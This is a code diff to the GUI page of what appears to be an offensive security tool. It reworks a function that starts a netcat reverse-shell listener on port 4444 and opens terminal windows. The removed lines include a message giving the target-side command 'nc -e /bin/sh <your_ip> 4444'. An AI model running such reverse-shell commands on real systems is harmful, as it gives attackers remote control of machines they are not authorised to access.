@@ -199,17 +199,34 @@ class ShellManagementPage(QWidget):
     def quick_start_listener(self):
         """Quick start a reverse shell listener"""
         try:
-            from app.core.shell_manager import shell_manager
-            listener_id = shell_manager.create_reverse_shell_listener(4444, "netcat")
-            self.status_updated.emit(f"Listener started on port 4444: {listener_id}")
+            from app.core.listener_manager import listener_manager
+            from app.widgets.terminal_window import TerminalWindow
             
-            QMessageBox.information(
-                self, "Listener Started",
-                f"Reverse shell listener started on port 4444\n"
-                f"Listener ID: {listener_id}\n\n"
-                f"Use the following command on target:\n"
-                f"nc -e /bin/sh <your_ip> 4444"
-            )
+            listener_id = listener_manager.create_listener(4444, "netcat")
+            success = listener_manager.start_listener(listener_id)
+            
+            if success:
+                self.status_updated.emit(f"Listener started on port 4444: {listener_id}")
+                
+                # Launch standalone terminal window
+                if not hasattr(self, '_terminal_windows'):
+                    self._terminal_windows = {}
+                window = TerminalWindow(listener_id=listener_id)
+                window.show()
+                self._terminal_windows[listener_id] = window
+                
+                # Also open tab in the shell widget if possible
+                if hasattr(self.shell_widget, 'open_terminal_tab'):
+                    try:
+                        title = f"Listener: {listener_id}"
+                        self.shell_widget.open_terminal_tab(title, listener_id=listener_id)
+                    except Exception:
+                        pass
+            else:
+                linfo = listener_manager._listeners.get(listener_id)
+                error_info = linfo.get('error', 'Unknown error') if linfo else 'Unknown error'
+                QMessageBox.critical(self, "Error", 
+                                   f"Failed to start listener on port 4444\n\n{error_info}")
         except Exception as e:
             QMessageBox.critical(self, "Error", f"Failed to start listener: {str(e)}")
             
